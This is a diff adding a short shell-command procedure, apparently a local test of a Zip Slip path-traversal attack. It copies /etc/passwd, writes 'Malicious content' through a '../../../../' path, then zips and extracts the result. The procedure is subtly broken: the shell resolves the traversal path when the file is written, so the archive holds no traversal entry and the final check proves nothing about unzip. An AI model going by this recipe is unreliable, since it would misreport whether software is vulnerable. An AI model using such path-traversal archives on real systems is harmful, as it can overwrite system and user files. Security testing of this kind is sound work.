@@ -1,0 +1,16 @@
+Step 1: Copy /etc/passwd to a safe location
+sudo cp /etc/passwd /home/ali-hazimeh/Documents/test_passwd/passwd
+
+Step 2: Create the malicious directory structure
+mkdir -p /home/ali-hazimeh/Downloads/zipslip/test/malicious
+echo "Malicious content" > /home/ali-hazimeh/Downloads/zipslip/test/malicious/../../../../Documents/test_passwd/passwd
+Step 3: Create the ZIP file
+cd /home/ali-hazimeh/Downloads/zipslip
+zip -r malicious.zip test
+
+Step 4: Test the extraction
+mkdir /tmp/test_extraction
+unzip malicious.zip -d /tmp/test_extraction
+
+Step 5: Verify the results
+cat /home/ali-hazimeh/Documents/test_passwd/passwd
